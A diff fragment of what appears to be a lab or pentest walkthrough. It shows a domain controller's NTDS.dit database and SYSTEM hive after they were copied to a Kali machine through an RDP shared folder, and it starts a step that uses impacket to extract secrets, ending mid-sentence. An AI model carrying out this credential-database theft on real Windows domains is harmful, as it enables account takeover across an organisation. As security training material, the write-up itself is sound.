@@ -240,7 +240,7 @@ C:\Windows\system32>dir C:\NTDS
 C:\Windows\system32>
 ```
 
-Step18. We will now pull the folder to our main pc by the folder we shared via rdp. see as below
+Step18. We will now pull the folder to our main pc by the folder we shared via rdp. see as below and verified as well.
 ```bash
 ┌──(root㉿kali)-[~]
 └─# ls -la /home/arjun/Downloads/cyber/                                           
@@ -264,4 +264,4 @@ drwxrwxr-x 6 root  root      4096 Jul 19 12:05 PowerHuntShares
 NTDS.dit  SYSTEM
 ```
 
-
+Step19. Now we will extract the secrets via impacket command and we will 
